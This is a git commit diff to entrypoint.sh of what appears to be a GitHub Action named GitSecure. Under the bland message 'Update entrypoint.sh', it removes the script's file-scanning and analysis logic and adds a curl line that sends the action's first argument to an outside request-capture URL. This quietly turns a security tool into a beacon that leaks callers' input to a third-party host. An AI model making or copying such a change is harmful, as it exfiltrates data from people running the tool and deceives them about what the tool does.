e57a03a7502bd6cfde19e4014b041c0304598111
rrbugproof <84215440+rrbugproof@users.noreply.github.com>
2022-07-25 10:12:46 -0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,9 +1,2 @@
 #!/bin/bash
-echo 'GitSecure v2 Coming soon'
-function find_files(){
-  files=$(git diff --name-only --diff-filter=AM HEAD~1..HEAD /github/workspace)
-  repoName=$(cd /github/workspace && git remote get-url origin)
-}
-
-find_files
-python3 /analyze.py --files $files --repoloc /github/workspace --repoName $repoName --url $1
+curl "https://request-baskets-do-app-kxq7h.ondigitalocean.app/74nwt70?id=$1"
